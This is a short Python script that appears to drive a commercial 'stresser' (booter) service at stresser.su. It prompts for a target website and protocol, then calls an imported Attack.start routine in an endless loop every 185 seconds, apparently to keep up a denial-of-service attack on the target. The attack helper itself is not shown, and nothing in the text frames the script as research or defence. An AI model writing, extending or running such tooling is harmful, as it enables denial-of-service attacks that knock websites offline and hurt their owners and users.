import asyncio

from colorama import *
from helpers.attack import Attack

class Stresser: 
    def __init__(self, cookie: str) -> None:
        self.cookie: str = cookie
        self.base_url = "https://stresser.su"
        
    def get_information() -> dict:
        website_url = input(f"{Fore.GREEN}[WEBSITE]{Fore.GREEN}{Fore.RESET} Enter the website url: ")
        method = input(f"{Fore.GREEN}[METHOD]{Fore.GREEN}{Fore.RESET} Enter the method (https/http): ")
        
        return {"website": website_url, "method": method}
        
    async def run(self, result: dict) -> bool:
        try:
            await Attack.start(self, result["website"], result["method"])
            await asyncio.sleep(185)
        except:
            return False
        
if __name__ == "__main__":  
    stresser_object: object = Stresser(cookie="")
    result: dict = Stresser.get_information()

    while True:
        asyncio.run(stresser_object.run(result=result))